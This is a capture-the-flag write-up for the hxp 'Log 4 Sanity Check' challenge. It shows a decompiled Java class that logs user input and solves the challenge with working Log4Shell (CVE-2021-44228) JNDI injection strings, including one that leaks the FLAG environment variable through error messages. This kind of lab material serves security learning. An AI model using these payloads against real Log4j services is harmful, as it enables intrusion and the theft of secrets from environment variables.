## Log 4 Sanity Check

**Category:** Misc


### Description
ALARM ALARM

Download:
Log 4 sanity check-9afb8a24feb86db1.tar.xz (1.7 MiB)

Connection (mirrors):

```
nc 65.108.176.77 1337
```

### Solution

First of all let's connect to server and see what we will get in response:

```bash
$ nc 65.108.176.77 1337
What is your favourite CTF?
test
:(
```

We can see that, it get an input from us and will print some characters in screen. Looking in provided files, `Vuln.class` look interesting.
Opening this file with `bytecode viewer` will give us following source code:

```java
import org.apache.logging.log4j.Logger;
import java.util.Scanner;
import org.apache.logging.log4j.LogManager;

public class Vuln
{
    public static void main(final String[] array) {
        try {
            final Logger logger = LogManager.getLogger(Vuln.class);
            System.out.println("What is your favourite CTF?");
            final String next = new Scanner(System.in).next();
            if (next.toLowerCase().contains("dragon")) {
                System.out.println("<3");
                System.exit(0);
            }
            if (next.toLowerCase().contains("hxp")) {
                System.out.println(":)");
            }
            else {
                System.out.println(":(");
                logger.error("Wrong answer: {}", (Object)next);
            }
        }
        catch (Exception x) {
            System.err.println(x);
        }
    }
}
```

Also there is a hint provided in the challenge that points to link: `https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.pdf?__blob=publicationFile&v=6`.
Opening this link we will see that it is mentioning to vulnerability `CVE-2021-44228` which is vulnerability in Log4j library.

Knowing this, it is kind of obvious what should we do now. We need to use this vuln, and try to gain RCE or Read flag with this vulnerability.

#### POC
Here is the POC for existance of this vulnerability:

```bash
$ nc 65.108.176.77 1337
What is your favourite CTF?
${jndi:ldap://127.0.0.1/test}
:(

2021-12-17 22:18:13,669 main WARN Error looking up JNDI resource [ldap://127.0.0.1/test]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
	at java.naming/com.sun.jndi.ldap.Connection.<init>(Connection.java:252)
	at java.naming/com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
	at java.naming/com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1616)
	at java.naming/com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2847)
....
```

Which is giving us exception that proves this vuln exists. Also as u can see it is giving connection refused.
So if we have a ldap server, and send request to it we can create a reverse shell using following guideline:

```https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/```

I did tried many RCE Methods, tried to make a reverse shell with nc, did tried `curl`, `wget` and many other commands to get response in ldap server. but none of them works.

So tried to check `Dockerfile` see if there is anything useful. Checking Dockerfile, the last line seem to be interesting:

```bash
CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 "FLAG='$(cat /flag.txt)' /home/ctf/run.sh"
```

As u can see, `flag.txt` is copied in `FLAG` Environment variable. So maybe it's simpler than we thought. I tried to read flag in ldap request and finaly with following payload i could read the flag in error messages:

```bash
$ nc 65.108.176.77 1337
What is your favourite CTF?
${jndi:ldap://127.0.0.1/${env:FLAG}}
:(
2021-12-17 22:22:35,970 main WARN Error looking up JNDI resource [ldap://127.0.0.1/hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]

```

And as u can see, Flag is writen in exception errors.
